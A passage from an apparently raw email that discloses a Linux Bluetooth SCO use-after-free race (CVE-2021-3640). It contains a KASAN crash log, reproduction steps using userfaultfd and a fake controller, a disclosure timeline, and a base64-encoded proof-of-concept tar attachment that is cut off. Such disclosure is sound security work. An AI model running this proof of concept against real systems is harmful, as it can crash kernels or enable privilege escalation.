ev_do_close+0x51a/0x870<br>[ =C2=A0 62.872789] =C2=A0hci_unregister_dev+0x2=
3a/0xb70<br>[ =C2=A0 62.873054] =C2=A0vhci_release+0x3f/0x70<br>[ =C2=A0 62=
.873334] =C2=A0__fput+0x197/0x360<br>[ =C2=A0 62.873598] =C2=A0task_work_ru=
n+0xc0/0xe0<br>[ =C2=A0 62.873919] =C2=A0exit_to_user_mode_prepare+0xf0/0x1=
30<br>[ =C2=A0 62.874253] =C2=A0syscall_exit_to_user_mode+0x20/0x40<br>[ =
=C2=A0 62.874511] =C2=A0do_syscall_64+0x52/0x90<br>[ =C2=A0 62.874768] =C2=
=A0entry_SYSCALL_64_after_hwframe+0x44/0xae<br>[ =C2=A0 62.875160]<br>[ =C2=
=A0 62.875352] The buggy address belongs to the object at ffff888002478540<=
br>[ =C2=A0 62.875352] =C2=A0which belongs to the cache kmalloc-32 of size =
32<br>[ =C2=A0 62.875900] The buggy address is located 0 bytes inside of<br=
>[ =C2=A0 62.875900] =C2=A032-byte region [ffff888002478540, ffff8880024785=
60)<br>[ =C2=A0 62.876472] The buggy address belongs to the page:<br>[ =C2=
=A0 62.876885] page:00000000db13206d refcount:1 mapcount:0 mapping:00000000=
00000000 index:0x0 pfn:0x2478<br>[ =C2=A0 62.877481] flags: 0x1000000000002=
00(slab|node=3D0|zone=3D1)<br>[ =C2=A0 62.878361] raw: 0100000000000200 fff=
fea0000078d00 0000000e0000000e ffff888001041500<br>[ =C2=A0 62.878901] raw:=
 0000000000000000 0000000080400040 00000001ffffffff 0000000000000000<br>[ =
=C2=A0 62.879313] page dumped because: kasan: bad access detected<br>[ =C2=
=A0 62.879588]<br>[ =C2=A0 62.879704] Memory state around the buggy address=
:<br>[ =C2=A0 62.880003] =C2=A0ffff888002478400: fb fb fb fb fc fc fc fc fb=
 fb fb fb fc fc fc fc<br>[ =C2=A0 62.880286] =C2=A0ffff888002478480: fb fb =
fb fb fc fc fc fc fb fb fb fb fc fc fc fc<br>[ =C2=A0 62.880532] &gt;ffff88=
8002478500: fa fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc<br>[ =C2=A0 62.=
880785] =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0^<br>[ =C2=A0 62.881199] =C2=A0ffff888002478580: 00 00 00 00 f=
c fc fc fc 00 00 00 fc fc fc fc fc<br>[ =C2=A0 62.881457] =C2=A0ffff8880024=
78600: 00 00 00 fc fc fc fc fc 00 00 00 fc fc fc fc fc<br>[ =C2=A0 62.88171=
6] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D<br>[ =C2=A0 62.881991] =
Disabling lock debugging due to kernel taint<br>[ =C2=A0 62.883072] BUG: un=
able to handle page fault for address: fffffbfff22fa79f<br>[ =C2=A0 62.8834=
27] #PF: supervisor read access in kernel mode<br>[ =C2=A0 62.883774] #PF: =
error_code(0x0000) - not-present page<br>[ =C2=A0 62.884165] PGD 36fd0067 P=
4D 36fd0067 PUD 36df4067 PMD 0<br>[ =C2=A0 62.884827] Oops: 0000 [#1] SMP K=
ASAN NOPTI<br>[ =C2=A0 62.885132] CPU: 0 PID: 120 Comm: poc.sco.new Tainted=
: G =C2=A0 =C2=A0B =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 5.13.0+ #1<br>=
[ =C2=A0 62.885528] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), =
BIOS 1.10.2-1ubuntu1 04/01/2014<br>[ =C2=A0 62.885901] RIP: 0010:__asan_sto=
re8+0x6c/0xb0<br>[ =C2=A0 62.886184] Code: be 00 00 00 00 00 fc ff df 0f be=
 14 32 85 d2 74 07 83 e0 07 39 d0 7d 29 c3 48 89 fe 48 c1 ee 03 48 ba 00 00=
 00 00 00 fc ff df &lt;80&gt; 3c 16 00 75 11 48 89 c6 48 c1 ee 03 0f be 14 =
16 85 d2 75 d2 eb<br>[ =C2=A0 62.886853] RSP: 0018:ffff8880030ffbf8 EFLAGS:=
 00000006<br>[ =C2=A0 62.887244] RAX: ffffffff917d3d02 RBX: 000000000004000=
0 RCX: ffffffffba337d86<br>[ =C2=A0 62.887524] RDX: dffffc0000000000 RSI: 1=
ffffffff22fa79f RDI: ffffffff917d3cfb<br>[ =C2=A0 62.887855] RBP: 000000000=
0000030 R08: dffffc0000000000 R09: 0000000000000007<br>[ =C2=A0 62.888162] =
R10: ffffed100035159c R11: 00000000000000fb R12: ffffffff917a1b4b<br>[ =C2=
=A0 62.888476] R13: fffffffffffffff8 R14: ffff888001a8acdc R15: ffff8880364=
32188<br>[ =C2=A0 62.888838] FS: =C2=A000007f9b6c704740(0000) GS:ffff888036=
400000(0000) knlGS:0000000000000000<br>[ =C2=A0 62.889331] CS: =C2=A00010 D=
S: 0000 ES: 0000 CR0: 0000000080050033<br>[ =C2=A0 62.889908] CR2: fffffbff=
f22fa79f CR3: 00000000011c0000 CR4: 00000000003006f0<br>[ =C2=A0 62.890341]=
 Call Trace:<br>[ =C2=A0 62.890617] =C2=A0queued_spin_lock_slowpath+0x286/0=
x410<br>[ =C2=A0 62.890915] =C2=A0_raw_spin_lock_irqsave+0x9f/0xb0<br>[ =C2=
=A0 62.891201] =C2=A0skb_queue_tail+0x1c/0x90<br>[ =C2=A0 62.891548] =C2=A0=
hci_send_sco+0xd6/0x110<br>[ =C2=A0 62.891871] =C2=A0sco_sock_sendmsg+0x1e1=
/0x2c0<br>[ =C2=A0 62.892170] =C2=A0? sco_sock_getsockopt+0x410/0x410<br>[ =
=C2=A0 62.892511] =C2=A0? inet_send_prepare+0x190/0x190<br>[ =C2=A0 62.8927=
96] =C2=A0sock_write_iter+0x21b/0x230<br>[ =C2=A0 62.893156] =C2=A0vfs_writ=
e+0x53a/0x5c0<br>[ =C2=A0 62.893533] =C2=A0ksys_write+0x8b/0x100<br>[ =C2=
=A0 62.893870] =C2=A0? __fpregs_load_activate+0xc2/0x150<br>[ =C2=A0 62.894=
258] =C2=A0do_syscall_64+0x43/0x90<br>[ =C2=A0 62.894523] =C2=A0entry_SYSCA=
LL_64_after_hwframe+0x44/0xae<br>[ =C2=A0 62.894929] RIP: 0033:0x7f9b6c8d4a=
bf<br>[ =C2=A0 62.895178] Code: 89 54 24 18 48 89 74 24 10 89 7c 24 08 e8 6=
9 fd ff ff 48 8b 54 24 18 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 01 00 00 0=
0 0f 05 &lt;48&gt; 3d 00 f0 ff ff 77 2d 44 89 c7 48 89 44 24 08 e8 9c fd ff=
 ff 48<br>[ =C2=A0 62.895930] RSP: 002b:00007ffd6b0133a0 EFLAGS: 00000293 O=
RIG_RAX: 0000000000000001<br>[ =C2=A0 62.896396] RAX: ffffffffffffffda RBX:=
 000055be494024e0 RCX: 00007f9b6c8d4abf<br>[ =C2=A0 62.896749] RDX: 0000000=
000000010 RSI: 00007f9b6c90e000 RDI: 0000000000000005<br>[ =C2=A0 62.897081=
] RBP: 00007ffd6b013480 R08: 0000000000000000 R09: 00007f9b6c703700<br>[ =
=C2=A0 62.897430] R10: 00007f9b6c7039d0 R11: 0000000000000293 R12: 000055be=
49400d10<br>[ =C2=A0 62.897814] R13: 00007ffd6b013570 R14: 0000000000000000=
 R15: 0000000000000000<br>[ =C2=A0 62.898239] Modules linked in:<br>[ =C2=
=A0 62.898623] CR2: fffffbfff22fa79f<br>[ =C2=A0 62.899350] ---[ end trace =
e705e323d4c8b589 ]---<br>[ =C2=A0 62.899645] RIP: 0010:__asan_store8+0x6c/0=
xb0<br>[ =C2=A0 62.899918] Code: be 00 00 00 00 00 fc ff df 0f be 14 32 85 =
d2 74 07 83 e0 07 39 d0 7d 29 c3 48 89 fe 48 c1 ee 03 48 ba 00 00 00 00 00 =
fc ff df &lt;80&gt; 3c 16 00 75 11 48 89 c6 48 c1 ee 03 0f be 14 16 85 d2 7=
5 d2 eb<br>[ =C2=A0 62.900625] RSP: 0018:ffff8880030ffbf8 EFLAGS: 00000006<=
br>[ =C2=A0 62.900997] RAX: ffffffff917d3d02 RBX: 0000000000040000 RCX: fff=
fffffba337d86<br>[ =C2=A0 62.901276] RDX: dffffc0000000000 RSI: 1ffffffff22=
fa79f RDI: ffffffff917d3cfb<br>[ =C2=A0 62.901700] RBP: 0000000000000030 R0=
8: dffffc0000000000 R09: 0000000000000007<br>[ =C2=A0 62.902083] R10: ffffe=
d100035159c R11: 00000000000000fb R12: ffffffff917a1b4b<br>[ =C2=A0 62.9024=
96] R13: fffffffffffffff8 R14: ffff888001a8acdc R15: ffff888036432188<br>[ =
=C2=A0 62.902820] FS: =C2=A000007f9b6c704740(0000) GS:ffff888036400000(0000=
) knlGS:0000000000000000<br>[ =C2=A0 62.903228] CS: =C2=A00010 DS: 0000 ES:=
 0000 CR0: 0000000080050033<br>[ =C2=A0 62.903566] CR2: fffffbfff22fa79f CR=
3: 00000000011c0000 CR4: 00000000003006f0<br><br>=3D*=3D*=3D*=3D*=3D*=3D*=
=3D*=3D*=3D =C2=A0BUG REPRODUCE =C2=A0=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D<b=
r><br>As above introduced, this race condition is highly controllable with =
userfaultfd techniques.<br><br>The attacker has to fake an SCO connection a=
nd then calls sco_sock_sendmsg() with the expected controllable faulting pa=
ge.<br>After that, the attacker just needs to detach the controller to call=
 sco_conn_del().<br><br>The calling trace is:<br><br>hci_unregister_dev() -=
&gt; hci_dev_do_close() -&gt; hci_conn_hash_flush() -&gt; hci_disconn_cfm()=
 -&gt;<br>sco_disconn_cfm() -&gt; sco_conn_del().<br><br>You can refer to t=
he provided POC code for the details.</font><div><font face=3D"monospace"><=
br></font></div><div><div><font face=3D"monospace">=3D*=3D*=3D*=3D*=3D*=3D*=
=3D*=3D*=3D =C2=A0Timeline=C2=A0 =3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D</font>=
<br></div><div><font face=3D"monospace"><br></font></div><div><font face=3D=
"monospace">2021-07-08: Bug reported to=C2=A0<a href=3D"mailto:security@ker=
nel.org" target=3D"_blank">security@kernel.org</a>=C2=A0and=C2=A0<a href=3D=
"mailto:linux-distros@vs.openwall.org" target=3D"_blank">linux-distros@vs.o=
penwall.org</a></font></div><div><font face=3D"monospace">2021-07-09:=C2=A0=
</font><span style=3D"font-family:monospace">CVE-2021-3640 is assigned</spa=
n></div><div><span style=3D"font-family:monospace">2021-07-22: 14 days of t=
he embargo=C2=A0is over</span></div><div><span style=3D"font-family:monospa=
ce"><br></span></div><div><font face=3D"monospace">One sad thing is that th=
e bluez team is currently focused on fixing up the CVE-2021-3573, which I f=
ailed to properly patched, and the patch for this new is not yet fully disc=
ussed.</font></div><div><font face=3D"monospace">I hope the patch will be s=
ettled down and merged to the mainline=C2=A0in the near future.</font></div=
><div><br></div><div><div><font face=3D"monospace">=3D*=3D*=3D*=3D*=3D*=3D*=
=3D*=3D*=3D =C2=A0Credt=C2=A0 =3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D*=3D</font></d=
iv></div><div><font face=3D"monospace">LinMa@BlockSec Team</font></div><div=
><br></div><div><span style=3D"font-family:monospace">Best Regards</span></=
div></div></div>

--0000000000006d7a7b05c7b0648f--

--0000000000006d7a7c05c7b06491
Content-Type: application/x-tar; name="reproduce.tar"
Content-Disposition: attachment; filename="reproduce.tar"
Content-Transfer-Encoding: base64
Content-ID: <f_krej991t0>
X-Attachment-Id: f_krej991t0

cmVwcm8vAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAADAwMDA3NzUAMDAwMTc1MAAwMDAxNzUwADAwMDAwMDAwMDAw
ADE0MDcxNTcyMjYzADAxMDM0NAAgNQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhciAgAGxpbgAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbGluAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAByZXByby9zeXprYWxsZXJfdXRpbHMuYwAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMDAwMDY2NAAwMDAxNzUwADAw
MDE3NTAAMDAwMDAwMTE2NzAAMTQwNzE0NjAzNDMAMDEzNzUwACAwAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAHVzdGFyICAAbGluAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABs
aW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACNpbmNsdWRlICJz
eXprYWxsZXJfdXRpbHMuaCIKCnZvaWQgaGNpX3NlbmRfZXZlbnRfY21kX2Nv
bXBsZXRlKGludCBmZCwgdWludDE2IG9wY29kZSwgdm9pZCogZGF0YSwgc2l6
ZV90IGRhdGFfbGVuKQp7CiAgICAgICAgc3RydWN0IGlvdmVjIGl2WzRdOwoK
ICAgICAgICBzdHJ1Y3QgaGNpX2V2ZW50X2hkciBoZHI7CiAgICAgICAgaGRy
LmV2dCA9IEhDSV9FVl9DTURfQ09NUExFVEU7CiAgICAgICAgaGRyLnBsZW4g
PSBzaXplb2Yoc3RydWN0IGhjaV9ldl9jbWRfY29tcGxldGUpICsgZGF0YV9s
ZW47CgogICAgICAgIHN0cnVjdCBoY2lfZXZfY21kX2NvbXBsZXRlIGV2dF9o
ZHI7CiAgICAgICAgZXZ0X2hkci5uY21kID0gMTsKICAgICAgICBldnRfaGRy
Lm9wY29kZSA9IG9wY29kZTsKCiAgICAgICAgdWludDggdHlwZSA9IEhDSV9F
VkVOVF9QS1Q7CgogICAgICAgIGl2WzBdLmlvdl9iYXNlID0gJnR5cGU7CiAg
ICAgICAgaXZbMF0uaW92X2xlbiA9IHNpemVvZih0eXBlKTsKICAgICAgICBp
dlsxXS5pb3ZfYmFzZSA9ICZoZHI7CiAgICAgICAgaXZbMV0uaW92X2xlbiA9
IHNpemVvZihoZHIpOwogICAgICAgIGl2WzJdLmlvdl9iYXNlID0gJmV2dF9o
ZHI7CiAgICAgICAgaXZbMl0uaW92X2xlbiA9IHNpemVvZihldnRfaGRyKTsK
ICAgICAgICBpdlszXS5pb3ZfYmFzZSA9IGRhdGE7CiAgICAgICAgaXZbM10u
aW92X2xlbiA9IGRhdGFfbGVuOwoKICAgICAgICBpZiAod3JpdGV2KGZkLCBp
diwgc2l6ZW9mKGl2KSAvIHNpemVvZihzdHJ1Y3QgaW92ZWMpKSA8IDApCiAg
ICAgICAgICAgICAgICBmYWlsKCJ3cml0ZXYgZmFpbGVkIik7Cn0KCnZvaWQg
aGNpX3NlbmRfZXZlbnRfcGFja2V0KGludCBmZCwgdWludDggZXZ0LCB2b2lk
KiBkYXRhLCBzaXplX3QgZGF0YV9sZW4pCnsKICAgICAgICBzdHJ1Y3QgaW92
ZWMgaXZbM107CgogICAgICAgIHN0cnVjdCBoY2lfZXZlbnRfaGRyIGhkcjsK
ICAgICAgICBoZHIuZXZ0ID0gZXZ0OwogICAgICAgIGhkci5wbGVuID0gZGF0
YV9sZW47CgogICAgICAgIHVpbnQ4IHR5cGUgPSBIQ0lfRVZFTlRfUEtUOwoK
ICAgICAgICBpdlswXS5pb3ZfYmFzZSA9ICZ0eXBlOwogICAgICAgIGl2WzBd
Lmlvdl9sZW4gPSBzaXplb2YodHlwZSk7CiAgICAgICAgaXZbMV0uaW92X2Jh
c2UgPSAmaGRyOwogICAgICAgIGl2WzFdLmlvdl9sZW4gPSBzaXplb2YoaGRy
KTsKICAgICAgICBpdlsyXS5pb3ZfYmFzZSA9IGRhdGE7CiAgICAgICAgaXZb
Ml0uaW92X2xlbiA9IGRhdGFfbGVuOwoKICAgICAgICBpZiAod3JpdGV2KGZk
LCBpdiwgc2l6ZW9mKGl2KSAvIHNpemVvZihzdHJ1Y3QgaW92ZWMpKSA8IDAp
CiAgICAgICAgICAgICAgICBmYWlsKCJ3cml0ZXYgZmFpbGVkIik7Cn0KCnN0
YXRpYyBib29sIHByb2Nlc3NfY29tbWFuZF9wa3QoaW50IGZkLCBjaGFyKiBi
dWYsIHNzaXplX3QgYnVmX3NpemUpCnsKICAgICAgICBzdHJ1Y3QgaGNpX2Nv
bW1hbmRfaGRyKiBoZHIgPSAoc3RydWN0IGhjaV9jb21tYW5kX2hkciopYnVm
OwogICAgICAgIGlmIChidWZfc2l6ZSA8IChzc2l6ZV90KXNpemVvZihzdHJ1
Y3QgaGNpX2NvbW1hbmRfaGRyKSB8fAogICAgICAgICAgICBoZHItPnBsZW4g
IT0gYnVmX3NpemUgLSBzaXplb2Yoc3RydWN0IGhjaV9jb21tYW5kX2hkcikp
IHsKICAgICAgICAgICAgICAgIGZhaWwoInByb2Nlc3NfY29tbWFuZF9wa3Q6
IGludmFsaWQgc2l6ZSIpOwogICAgICAgIH0KCgkvLyBwcmludGYoIlsrXSBw
cm9jY3NpbmcgY29tbWFuZCBvcGNvZGU6ICV4XG4iLCBoZHItPm9wY29kZSk7
Cglib29sIHJldG9ybm90ID0gZmFsc2U7CgogICAgICAgIHN3aXRjaCAoaGRy
LT5vcGNvZGUpIHsKCWNhc2UgSENJX09QX1dSSVRFX0NBX1RJTUVPVVQ6IHsK
ICAgICAgICAgICAgICAgIHJldG9ybm90ID0gdHJ1ZTsKCQlicmVhazsKICAg
ICAgICB9CiAgICAgICAgY2FzZSBIQ0lfT1BfUkVBRF9CRF9BRERSOiB7CiAg
ICAgICAgICAgICAgICBzdHJ1Y3QgaGNpX3JwX3JlYWRfYmRfYWRkciBycCA9
IHswfTsKICAgICAgICAgICAgICAgIHJwLnN0YXR1cyA9IDA7CiAgICAgICAg
ICAgICAgICBtZW1zZXQoJnJwLmJkYWRkciwgMHhhYSwgNik7CiAgICAgICAg
ICAgICAgICBoY2lfc2VuZF9ldmVudF9jbWRfY29tcGxldGUoZmQsIGhkci0+
b3Bjb2RlLCAmcnAsIHNpemVvZihycCkpOwogICAgICAgICAgICAgICAgcmV0
dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBjYXNlIEhDSV9PUF9SRUFE
X0JVRkZFUl9TSVpFOiB7CiAgICAgICAgICAgICAgICBzdHJ1Y3QgaGNpX3Jw
X3JlYWRfYnVmZmVyX3NpemUgcnAgPSB7MH07CiAgICAgICAgICAgICAgICBy
cC5zdGF0dXMgPSAwOwogICAgICAgICAgICAgICAgcnAuYWNsX210dSA9IDEw
MjE7CiAgICAgICAgICAgICAgICBycC5zY29fbXR1ID0gOTY7CiAgICAgICAg
ICAgICAgICBycC5hY2xfbWF4X3BrdCA9IDQ7CiAgICAgICAgICAgICAgICBy
cC5zY29fbWF4X3BrdCA9IDY7CiAgICAgICAgICAgICAgICBoY2lfc2VuZF9l
dmVudF9jbWRfY29tcGxldGUoZmQsIGhkci0+b3Bjb2RlLCAmcnAsIHNpemVv
ZihycCkpOwogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAg
IH0KICAgICAgICBjYXNlIEhDSV9PUF9SRUFEX0xPQ0FMX0ZFQVRVUkVTOiB7
CiAgICAgICAgICAgICAgICBzdHJ1Y3QgaGNpX3JwX3JlYWRfbG9jYWxfZmVh
dHVyZXMgcnAgPSB7MH07CiAgICAgICAgICAgICAgICBycC5zdGF0dXMgPSAw
eDA7CiAgICAgICAgICAgICAgICB1aW50OF90IHRtcFs4XSA9IHswfTsKICAg
ICAgICAgICAgICAgIHRtcFszXSB8PSAweDgwOyAvLyBMTVBfRVNDTwogICAg
ICAgICAgICAgICAgbWVtY3B5KCZycC5mZWF0dXJlcywgdG1wLCA4KTsKICAg
ICAgICAgICAgICAgIGhjaV9zZW5kX2V2ZW50X2NtZF9jb21wbGV0ZShmZCwg
aGRyLT5vcGNvZGUsICZycCwgc2l6ZW9mKHJwKSk7CiAgICAgICAgICAgICAg
ICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAg
Y2hhciBkdW1teVsweGY5XSA9IHswfTsKICAgICAgICBoY2lfc2VuZF9ldmVu
dF9jbWRfY29tcGxldGUoZmQsIGhkci0+b3Bjb2RlLCBkdW1teSwgc2l6ZW9m
KGR1bW15KSk7CiAgICAgICAgaWYgKCFyZXRvcm5vdCkgcmV0dXJuIGZhbHNl
OwoJZWxzZSByZXR1cm4gdHJ1ZTsKfQoKCnN0YXRpYyB2b2lkKiBldmVudF90
aHJlYWQodm9pZCogYXJnKQp7CglpbnQgdmhjaV9mZCA9ICooaW50Kilhcmc7
CiAgICAgICAgd2hpbGUgKDEpIHsKICAgICAgICAgICAgICAgIGNoYXIgYnVm
WzEwMjRdID0gezB9OwogICAgICAgICAgICAgICAgc3NpemVfdCBidWZfc2l6
ZSA9IHJlYWQodmhjaV9mZCwgYnVmLCBzaXplb2YoYnVmKSk7CiAgICAgICAg
ICAgICAgICBpZiAoYnVmX3NpemUgPCAwKQogICAgICAgICAgICAgICAgICAg
ICAgICBmYWlsKCJyZWFkIGZhaWxlZCIpOwogICAgICAgICAgICAgICAgaWYg
KGJ1Zl9zaXplID4gMCAmJiBidWZbMF0gPT0gSENJX0NPTU1BTkRfUEtUKSB7
CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcm9jZXNzX2NvbW1hbmRf
cGt0KHZoY2lfZmQsIGJ1ZiArIDEsIGJ1Zl9zaXplIC0gMSkpCiAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAg
ICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBOVUxMOwp9CgpzdHJ1Y3Qg
dnBhcmFtIGluaXRpYWxpemVfdmhjaSgpCnsKCXN0cnVjdCB2cGFyYW0gcmVz
dWx0cDsKI2lmIFNZWl9FWEVDVVRPUgogICAgICAgIGlmICghZmxhZ192aGNp
X2luamVjdGlvbikKICAgICAgICAgICAgICAgIHJldHVybjsKI2VuZGlmCgog
ICAgICAgIGludCBoY2lfc29jayA9IHNvY2tldChBRl9CTFVFVE9PVEgsIFNP
Q0tfUkFXLCBCVFBST1RPX0hDSSk7CiAgICAgICAgaWYgKGhjaV9zb2NrIDwg
MCkKICAgICAgICAgICAgICAgIGZhaWwoInNvY2tldChBRl9CTFVFVE9PVEgs
IFNPQ0tfUkFXLCBCVFBST1RPX0hDSSkgZmFpbGVkIik7CgoJcmVzdWx0cC5z
b2NrID0gaGNpX3NvY2s7CgogICAgICAgIGludCB2aGNpX2ZkID0gb3Blbigi
L2Rldi92aGNpIiwgT19SRFdSKTsKICAgICAgICBpZiAodmhjaV9mZCA9PSAt
MSkKICAgICAgICAgICAgICAgIGZhaWwoIm9wZW4gL2Rldi92aGNpIGZhaWxl
ZCIpOwoKCXJlc3VsdHAuZmQgPSB2aGNpX2ZkOwoKICAgICAgICBzdHJ1Y3Qg
dmhjaV92ZW5kb3JfcGt0IHZlbmRvcl9wa3Q7CiAgICAgICAgaWYgKHJlYWQo
dmhjaV9mZCwgJnZlbmRvcl9wa3QsIHNpemVvZih2ZW5kb3JfcGt0KSkgIT0g
c2l6ZW9mKHZlbmRvcl9wa3QpKQogICAgICAgICAgICAgICAgZmFpbCgicmVh
ZCBmYWlsZWQiKTsKCiAgICAgICAgaWYgKHZlbmRvcl9wa3QudHlwZSAhPSBI
Q0lfVkVORE9SX1BLVCkKICAgICAgICAgICAgICAgIGZhaWwoIndyb25nIHJl
c3BvbnNlIHBhY2tldCIpOwoKICAgICAgICBwcmludGYoIlsrXSBoY2kgZGV2
IGlkOiAleFxuIiwgdmVuZG9yX3BrdC5pZCk7CgkKCXJlc3VsdHAuaWQgPSB2
ZW5kb3JfcGt0LmlkOwoKICAgICAgICBwdGhyZWFkX3QgdGg7CiAgICAgICAg
aWYgKHB0aHJlYWRfY3JlYXRlKCZ0aCwgTlVMTCwgZXZlbnRfdGhyZWFkLCAm
dmhjaV9mZCkpCiAgICAgICAgICAgICAgICBmYWlsKCJwdGhyZWFkX2NyZWF0
ZSBmYWlsZWQiKTsKCiAgICAgICAgLy8gQnJpbmcgaGNpIGRldmljZSB1cAog
ICAgICAgIGludCByZXQgPSBpb2N0bChoY2lfc29jaywgSENJREVWVVAsIHZl
bmRvcl9wa3QuaWQpOwoKICAgICAgICBpZiAocmV0KSB7CiAgICAgICAgICAg
ICAgICBpZiAocmV0ICYmIGVycm5vICE9IEVBTFJFQURZKQogICAgICAgICAg
ICAgICAgICAgICAgICBmYWlsKCJpb2N0bChIQ0lERVZVUCkgZmFpbGVkIik7
CiAgICAgICAgfQoKIAkvLyBUaGUgc2FkIHRoaW5nIGlzIHNjYW5uaW5nIG1v
ZGUgcmVxdWlyZXMgYWRtaW4gcHJpdmlsZWdlCglwdGhyZWFkX2pvaW4odGgs
IE5VTEwpOwoJLy8gSSB0aGluayBkb24ndCBoYXZlIHRvIGNyZWF0ZSBhbnkg
Y29ubmVjdGlvbi4uCglwcmludGYoIlsrXSBkZXZpY2UgaGNpLSVkIGluaXQg
ZG9uZVxuIiwgcmVzdWx0cC5pZCk7CglyZXR1cm4gcmVzdWx0cDsKfSAKAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcmVwcm8vc3l6a2FsbGVyX3V0aWxz
LmgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA2NjQAMDAw
MTc1MAAwMDAxNzUwADAwMDAwMDE0NTE3ADE0MDcxNDYwMzQxADAxMzc1NgAg
MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAB1c3RhciAgAGxpbgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAbGluAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjaW5j
bHVkZSA8ZXJybm8uaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxs
aW51eC9yZmtpbGwuaD4KI2luY2x1ZGUgPHB0aHJlYWQuaD4KI2luY2x1ZGUg
PHN5cy9lcG9sbC5oPgojaW5jbHVkZSA8c3lzL2lvY3RsLmg+CiNpbmNsdWRl
IDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxzeXMvdWlvLmg+CiNpbmNsdWRl
IDxzdGRpbnQuaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8
dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0ZGlv
Lmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN5cy9zeXNjYWxs
